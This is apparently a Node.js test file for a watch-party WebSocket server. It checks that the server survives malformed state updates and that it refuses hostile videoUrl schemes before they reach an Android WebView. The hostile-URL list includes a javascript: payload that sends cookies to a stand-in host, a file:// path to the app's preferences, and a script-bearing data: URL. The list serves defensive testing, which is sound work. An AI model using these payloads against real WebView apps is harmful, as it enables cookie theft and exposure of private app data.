// Message-boundary validation. These tests exist because a single malformed
// state-update used to kill the whole process: `msg.time?.toFixed(2)` in a log
// line is guarded against null but not against a string, and the resulting
// TypeError was thrown synchronously inside the ws 'message' listener — where
// neither the HTTP error boundary nor the unhandledRejection handler could see it.
//
// Every case here asserts the server is STILL ALIVE afterwards. Rejecting a bad
// message is fine; dying because of one is the bug.
const { test } = require("node:test");
const assert = require("node:assert");
const http = require("node:http");
const WebSocket = require("ws");
const { startServer } = require("./harness");

const wait = (ms) => new Promise((r) => setTimeout(r, ms));

// A failing assertion skips any close() after it, and a still-open socket keeps
// the test runner's event loop alive forever. Track every socket and close them
// all in each test's finally instead.
const openSockets = [];
function closeAll() {
  while (openSockets.length) {
    try {
      openSockets.pop().terminate();
    } catch {}
  }
}

function joinRoom(
  wsUrl,
  { roomId, clientId, displayName, videoUrl, platform },
) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(wsUrl);
    openSockets.push(ws);
    ws.relayed = [];
    ws.on("open", () =>
      ws.send(
        JSON.stringify({
          type: "join",
          roomId,
          clientId,
          displayName,
          videoUrl,
          platform,
        }),
      ),
    );
    ws.on("message", (raw) => {
      const msg = JSON.parse(raw);
      if (msg.type === "joined") resolve({ ws, joined: msg });
      if (msg.type === "state-update") ws.relayed.push(msg);
    });
    ws.on("error", reject);
  });
}

function getJson(url) {
  return new Promise((resolve, reject) => {
    http
      .get(url, (res) => {
        let body = "";
        res.on("data", (d) => (body += d));
        res.on("end", () =>
          resolve({
            status: res.statusCode,
            json: body ? JSON.parse(body) : null,
          }),
        );
      })
      .on("error", reject);
  });
}

// /health returns plain text "OK", not JSON — must not go through getJson().
const alive = (srv) =>
  new Promise((resolve) => {
    const req = http.get(srv.baseUrl + "/health", (res) => {
      res.resume();
      resolve(res.statusCode === 200);
    });
    req.on("error", () => resolve(false));
    req.setTimeout(3000, () => {
      req.destroy();
      resolve(false);
    });
  });

// ── the crash ────────────────────────────────────────────────────────────────

const MALFORMED = [
  ["time as string", { time: "12.5", paused: false }],
  ["time as NaN", { time: NaN, paused: false }], // serialises to null
  ["time as object", { time: { n: 1 }, paused: false }],
  ["time negative", { time: -5, paused: false }],
  ["time absent", { paused: false }],
  ["paused as string", { time: 10, paused: "false" }],
  ["paused absent", { time: 10 }],
  ["videoUrl as number", { time: 10, paused: false, videoUrl: 42 }],
  [
    "videoUrl absurdly long",
    { time: 10, paused: false, videoUrl: "https://x.com/" + "a".repeat(5000) },
  ],
];

for (const [label, payload] of MALFORMED) {
  test(`server survives a state-update with ${label}`, async () => {
    const srv = await startServer({ port: 8141 });
    try {
      const a = await joinRoom(srv.wsUrl, {
        roomId: "V1",
        clientId: "c1",
        displayName: "Ann",
        videoUrl: "https://hotstar.com/x",
        platform: "hotstar",
      });
      a.ws.send(JSON.stringify({ type: "state-update", ...payload }));
      await wait(400);
      assert.ok(await alive(srv), `server died on ${label}`);
      a.ws.close();
    } finally {
      closeAll();
      await srv.stop();
    }
  });
}

test("a rejected state-update leaves prior room state untouched", async () => {
  const srv = await startServer({ port: 8142 });
  try {
    const a = await joinRoom(srv.wsUrl, {
      roomId: "V2",
      clientId: "c1",
      displayName: "Ann",
      videoUrl: "https://hotstar.com/good",
      platform: "hotstar",
    });
    a.ws.send(
      JSON.stringify({
        type: "state-update",
        time: 30,
        paused: true,
        videoUrl: "https://hotstar.com/good",
      }),
    );
    await wait(150);
    a.ws.send(
      JSON.stringify({ type: "state-update", time: "bad", paused: false }),
    );
    await wait(300);

    assert.ok(await alive(srv), "server survived");
    const s = await getJson(srv.baseUrl + "/api/room/V2");
    assert.strictEqual(
      s.json.videoUrl,
      "https://hotstar.com/good",
      "good state preserved after a rejected update",
    );
    a.ws.close();
  } finally {
    closeAll();
    await srv.stop();
  }
});

test("a valid state-update still relays to guests", async () => {
  const srv = await startServer({ port: 8143 });
  try {
    const a = await joinRoom(srv.wsUrl, {
      roomId: "V3",
      clientId: "c1",
      displayName: "Ann",
      videoUrl: "https://hotstar.com/x",
      platform: "hotstar",
    });
    const b = await joinRoom(srv.wsUrl, {
      roomId: "V3",
      clientId: "c2",
      displayName: "Bob",
      videoUrl: "https://hotstar.com/x",
      platform: "hotstar",
    });
    a.ws.send(
      JSON.stringify({
        type: "state-update",
        time: 77.5,
        paused: false,
        videoUrl: "https://hotstar.com/x",
      }),
    );
    await wait(300);
    assert.strictEqual(b.ws.relayed.length, 1, "guest got exactly one update");
    assert.strictEqual(b.ws.relayed[0].time, 77.5);
    a.ws.close();
    b.ws.close();
  } finally {
    closeAll();
    await srv.stop();
  }
});

// ── videoUrl scheme injection ────────────────────────────────────────────────
//
// A non-navigable videoUrl reaches WebView.loadUrl on the Android guest
// (MainActivity.onSyncCommand → SyncPolicy.shouldReload → loadUrl), where a
// `javascript:` URL executes inside the currently loaded streaming site's origin.
// There are two independent ways to plant one.

const HOSTILE_URLS = [
  "javascript:fetch('https://evil.example/'+document.cookie)",
  "file:///data/data/com.fluffles.watchparty/shared_prefs/hwp_prefs.xml",
  "data:text/html,<script>alert(1)</script>",
  "intent://evil#Intent;scheme=https;end",
  "about:blank",
];

for (const hostile of HOSTILE_URLS) {
  const label = hostile.slice(0, 24);

  // Path A — plant it via `join`, which writes roomState directly. Needs no host
  // role and no state-update: the poison is served to every LATER joiner in their
  // `joined` payload, and leaks through the unauthenticated /api/room/:id.
  test(`join does not accept a ${label}… videoUrl`, async () => {
    const srv = await startServer({
      port: 8144,
      env: { ROOM_GRACE_MS: "5000" },
    });
    try {
      const evil = await joinRoom(srv.wsUrl, {
        roomId: "H1",
        clientId: "evil",
        displayName: "E",
        videoUrl: hostile,
        platform: "hotstar",
      });
      const victim = await joinRoom(srv.wsUrl, {
        roomId: "H1",
        clientId: "victim",
        displayName: "V",
        videoUrl: "https://hotstar.com/ok",
        platform: "hotstar",
      });

      assert.notStrictEqual(
        victim.joined.videoUrl,
        hostile,
        "joined payload must not carry a non-navigable URL",
      );
      const status = await getJson(srv.baseUrl + "/api/room/H1");
      assert.notStrictEqual(
        status.json.videoUrl,
        hostile,
        "/api/room must not leak a non-navigable URL",
      );
      evil.ws.close();
      victim.ws.close();
    } finally {
      closeAll();
      await srv.stop();
    }
  });

  // Path B — plant it via state-update as host.
  test(`state-update does not relay a ${label}… videoUrl`, async () => {
    const srv = await startServer({ port: 8145 });
    try {
      const a = await joinRoom(srv.wsUrl, {
        roomId: "H2",
        clientId: "c1",
        displayName: "Ann",
        videoUrl: "https://hotstar.com/x",
        platform: "hotstar",
      });
      const b = await joinRoom(srv.wsUrl, {
        roomId: "H2",
        clientId: "c2",
        displayName: "Bob",
        videoUrl: "https://hotstar.com/x",
        platform: "hotstar",
      });
      a.ws.send(
        JSON.stringify({
          type: "state-update",
          time: 5,
          paused: false,
          videoUrl: hostile,
        }),
      );
      await wait(300);

      assert.ok(
        !b.ws.relayed.some((m) => m.videoUrl === hostile),
        "guest must never be told to navigate to a non-navigable URL",
      );
      a.ws.close();
      b.ws.close();
    } finally {
      closeAll();
      await srv.stop();
    }
  });
}

test("an ordinary https videoUrl still flows through join and state-update", async () => {
  const srv = await startServer({ port: 8146, env: { ROOM_GRACE_MS: "5000" } });
  try {
    const a = await joinRoom(srv.wsUrl, {
      roomId: "H3",
      clientId: "c1",
      displayName: "Ann",
      videoUrl: "https://www.hotstar.com/in/movies/abc/12345",
      platform: "hotstar",
    });
    const b = await joinRoom(srv.wsUrl, {
      roomId: "H3",
      clientId: "c2",
      displayName: "Bob",
      videoUrl: "https://www.hotstar.com/in/movies/abc/12345",
      platform: "hotstar",
    });
    assert.strictEqual(
      b.joined.videoUrl,
      "https://www.hotstar.com/in/movies/abc/12345",
      "join path preserves a good URL",
    );

    a.ws.send(
      JSON.stringify({
        type: "state-update",
        time: 12,
        paused: false,
        videoUrl: "https://www.hotstar.com/in/tv/xyz/999",
      }),
    );
    await wait(300);
    assert.strictEqual(
      b.ws.relayed.at(-1).videoUrl,
      "https://www.hotstar.com/in/tv/xyz/999",
      "state-update path preserves a good URL",
    );
    a.ws.close();
    b.ws.close();
  } finally {
    closeAll();
    await srv.stop();
  }
});
